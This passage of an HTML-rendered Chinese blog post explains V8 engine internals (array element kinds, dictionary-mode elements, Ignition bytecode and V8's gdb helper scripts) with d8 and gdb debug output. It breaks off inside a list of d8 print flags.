class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">b</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503b71 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; [FAST_ELEMENTS (COW)]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b408191 &lt;String[1]: b&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503b71: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x236e9503d29 &lt;Map(FAST_HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - transitions #1: 0x92dae108a81 &lt;TransitionArray[5]&gt;</span><br><span class="line">     0x31013b404069 &lt;Symbol: elements_transition_symbol&gt;: (transition to FAST_HOLEY_ELEMENTS) -&gt; 0x236e9503e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503e31 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503e31: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x236e9503b71 &lt;Map(FAST_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e950f779 [FastProperties]</span><br><span class="line"> - prototype = 0xf279b90c9e9</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e950f779: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x31013b402311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0xf279b90cad9 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0xf279b90c9e9 &lt;Object map = 0x236e950f7d1&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">B</span><br><span class="line">c</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-082449.jpg" alt=""><br>  简言之，如果属性在接收者上找不到（接受者可以理解为要访问的属性或者方法指向的那个对象），那么就会继续到原型链上找。<br>这些元素是自给自足的，换言之，我们不需要在隐藏类上储存这些索引属性。另外，我们需要一个特殊的值，称之为空洞，来标记那些不存在属性。这点对于数组方法的性能很关键。<br>若是我们知道elements store没有空洞，是被填满的，我们可以提高本地操作（指无需原型链参与）的性能，不需要再去花费昂贵的代价查找原型链。</p><h3 id="Fast-or-Dictionary-Elements"><a href="#Fast-or-Dictionary-Elements" class="headerlink" title="Fast or Dictionary Elements"></a>Fast or Dictionary Elements</h3><p>  第二个关于元素的主要的区分为是否是快速或是字典模式。快速元素就是VM内部简单的将数组索引与elements store中的索引映射。<br>然而，这种简单表示，在那种有很大的空洞以及很少位置被占用的数组上是相当浪费的。在这种情况下，我们将转换成字典模式，这会减小内存但轻微的牺牲性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sparseArray = [];</span><br><span class="line">sparseArray[<span class="number">9999</span>] = <span class="string">"foo"</span>; <span class="comment">// Creates an array with dictionary elements.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">DebugPrint: 0x6ed6db8c769: [JSArray]</span><br><span class="line"> - map = 0x16a58d0f779 [FastProperties]</span><br><span class="line"> - prototype = 0x37db83507f51</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 10000</span><br><span class="line"> - properties = 0x38a1eb682241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3529df1b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   9999: 0x37db8352faa9 &lt;String[3]: foo&gt; (data, dict_index: 0, attrs: [WEC])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145330.png" alt=""><br>0x270F=9999</p><p>  在这个例子中，如果给这个数组分配完整的10k个空间将会造成极大浪费。而实际上V8是创建了一个key-value-descriptor的triplets。这个例子中的key是“9999”，value是“foo”，而descriptor是使用的默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(array, <span class="number">0</span>, &#123;<span class="attr">value</span>: <span class="string">"fixed"</span>, <span class="attr">configurable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">%DebugPrint(array)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff43f1700 (LWP 18068)]</span><br><span class="line">DebugPrint: 0x28f5f190c759: [JSArray]</span><br><span class="line"> - map = 0x1e39b868f881 [FastProperties]</span><br><span class="line"> - prototype = 0x61172b07f51</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 1</span><br><span class="line"> - properties = 0x3c90a5102241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a07bddb6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   0: 0x3c90a5111569 &lt;String[5]: fixed&gt; (data, dict_index: 0, attrs: [___])</span><br><span class="line"> &#125;</span><br><span class="line">0x1e39b868f881: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e39b8683e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x61172b08a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x61172b07f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x61172b07f71 &lt;JSFunction Array (sfi = 0x3c90a513d6c1)&gt;</span><br><span class="line"> - code cache: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-084456.png" alt=""><br>  在上面例子中，我们给数组添加了一个non-configurable属性。这个信息就会被保存慢元素字典的triplet中的descriptor 部分。需要切记一点，数组方法在那些拥有慢元素的对象上的性能会相当慢。</p><h3 id="The-ElementsAccessor"><a href="#The-ElementsAccessor" class="headerlink" title="The ElementsAccessor"></a>The ElementsAccessor</h3><p>你可以想到开发人员根本不愿意为这20种元素在C++中对应重复写20遍数组方法。这里就是体现C++神奇的地方了。为了不实现数组方法一遍又一遍，我们建立了一个属性存取器（ElementsAccessor），在它里面大部分都仅仅是简单的属性访问相关的方法。这个属性访问其依赖C++中的CRTP来实现不同种类需求的数组方法。所以，有时如果我们调用例如数组的slice，V8会调用C++中的代码，然后通过属性存取器来选择所需函数，如slice的专门版本。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-090501.jpg" alt=""></p><h2 id="学习v8字节码"><a href="#学习v8字节码" class="headerlink" title="学习v8字节码"></a>学习v8字节码</h2><h3 id="阅读和打印（只是个例子）"><a href="#阅读和打印（只是个例子）" class="headerlink" title="阅读和打印（只是个例子）"></a>阅读和打印（只是个例子）</h3><p><code>./d8 --print-bytecode test.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function incrementX(obj) &#123;</span><br><span class="line">  return 1 + obj.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">incrementX(&#123;x: 42&#125;);</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$ node --print-bytecode incrementX.js</span><br><span class="line">...</span><br><span class="line">[generating bytecode for function: incrementX]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 8</span><br><span class="line">  12 E&gt; 0x2ddf8802cf6e @    StackCheck</span><br><span class="line">  19 S&gt; 0x2ddf8802cf6f @    LdaSmi [1]</span><br><span class="line">        0x2ddf8802cf71 @    Star r0</span><br><span class="line">  34 E&gt; 0x2ddf8802cf73 @    LdaNamedProperty a0, [0], [4]</span><br><span class="line">  28 E&gt; 0x2ddf8802cf77 @    Add r0, [6]</span><br><span class="line">  36 S&gt; 0x2ddf8802cf7a @    Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x2ddf8802cf21: [FixedArray] in OldSpace</span><br><span class="line"> - map = 0x2ddfb2d02309 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br><span class="line">Handler Table (size = 16)</span><br></pre></td></tr></table></figure></p><ul><li>LdaSmi [1]<br>LdaSmi [1]将常量 1 加载到累加器中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144516.jpg" alt=""></li><li>Star r0<br>接下来，Star r0 将当前在累加器中的值 1 存储在寄存器 r0 中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145501.jpg" alt=""></li><li>LdaNamedProperty a0, [0], [4]<br>LdaNamedProperty 将 a0 的命名属性加载到累加器中。ai 指向 incrementX() 的第 i 个参数。在这个例子中，我们在 a0 上查找一个命名属性，这是 incrementX() 的第一个参数。该属性名由常量 0 确定。LdaNamedProperty 使用 0 在单独的表中查找名称：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br></pre></td></tr></table></figure></li></ul><p>可以看到，0 映射到了 x。因此这行字节码的意思是加载 obj.x。<br>那么值为 4 的操作数是干什么的呢？ 它是函数 incrementX() 的反馈向量的索引。反馈向量包含用于性能优化的 runtime 信息。<br>现在寄存器看起来是这样的：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145844.jpg" alt=""></p><ul><li><p>Add r0, [6]<br>最后一条指令将 r0 加到累加器，结果是 43。 6 是反馈向量的另一个索引。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145912.jpg" alt=""></p></li><li><p>Return<br>Return 返回累加器中的值。返回语句是函数 incrementX() 的结束。此时 incrementX() 的调用者可以在累加器中获得值 43，并可以进一步处理此值。</p></li></ul><p>乍一看，V8 的字节码看起来非常奇怪，特别是当我们打印出所有的额外信息。但是一旦你知道 Ignition 是一个带有累加器寄存器的寄存器，你就可以分析出大多数字节码都干了什么。</p><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-152050.png" alt=""></li></ul><h2 id="v8自带的gdb命令"><a href="#v8自带的gdb命令" class="headerlink" title="v8自带的gdb命令"></a>v8自带的gdb命令</h2><p>在/tools中可以找到gdbinit和gdb-v8-support.py<br>我将其都复制到调试路径下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ls | grep gdb</span><br><span class="line">gdbinit</span><br><span class="line">gdb-v8-support.py</span><br></pre></td></tr></table></figure></p><p>对如下代码进行测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">"hoge"</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ source gdbinit</span><br><span class="line">gdb-peda$ source gdb-v8-support.py </span><br><span class="line">gdb-peda$ find 0xdeadbee</span><br><span class="line">Searching for &apos;0xdeadbee&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">mapped : 0x5e88e28c6c4 --&gt; 0x7daafaa10deadbee </span><br><span class="line">   </span><br><span class="line">gdb-peda$ v8print 0x5e88e28c6c4-0x14+1</span><br><span class="line">0x5e88e28c6b1: [FixedArray]</span><br><span class="line"> - map = 0x2702dbb82679 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 233495534</span><br><span class="line">           1: 0x318d7daafaa1 &lt;Number 3.73593e+09&gt;</span><br><span class="line">           2: 0x318d7daafa81 &lt;String[4]: hoge&gt;</span><br><span class="line">gdb-peda$ v8print *(void **)(0x5e88e28c6c4-0x14)</span><br><span class="line">0x2702dbb82679: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x504a7702311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x504a7702231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><h2 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h2><h3 id="print-flag"><a href="#print-flag" class="headerlink" title="print flag"></a>print flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --help |grep print</span><br><span class="line">  --print_bytecode (print bytecode generated by ignition interpreter)</span><br><span class="line">  --print_bytecode_filter (filter for selecting which functions to print bytecode)</span><br><span class="line">  --hydrogen_stats (print statistics for hydrogen)</span><br><span class="line">  --print_deopt_stress (print number of possible deopt points)</span><br><span class="line">  --turbo_stats (print TurboFan statistics)</span><br><span class="line">  --turbo_stats_nvp (print TurboFan statistics in machine-readable format)</span><br><span class="line">  --print_wasm_code (Print WebAssembly code)</span><br><span class="line">  --trace_gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace_gc_nvp (print one detailed trace line in name=value format after each garbage collection)</span><br><span class="line">  --trace_gc_ignore_scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace_idle_notification (print one trace line following each idle notification)</span><br><span class="line">  --trace_idle_notification_verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace_gc_verbose (print more details following each garbage collection)</span><br><span class="line">  --trace_allocation_stack_interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace_mutator_utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace_codegen (print name of functions for which code is generated)</span><br><span class="line">  --trace_serializer (print code serializer trace)</span><br><span class="line">  --external_reference_stats (print statistics on external references used during serialization)</span><br><span class="line">  --trace_side_effect_free_debug_evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max_stack_trace_source_length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --trace_object_groups (print object groups detected during each garbage collection)</span><br><span class="line">  --use_idle_notification (Use idle notification to reduce memory footprint.)</span><br><span class="line">  --use_verbose_printer (allows verbose printing)</span><br><span class="line">  --log_regs_modified (When logging register values, only print modified registers.)</span><br><span class="line">  --stack_trace_on_illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --print_all_exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --print_ast (print source AST)</span><br><span class="line">  --print_builtin_ast (print 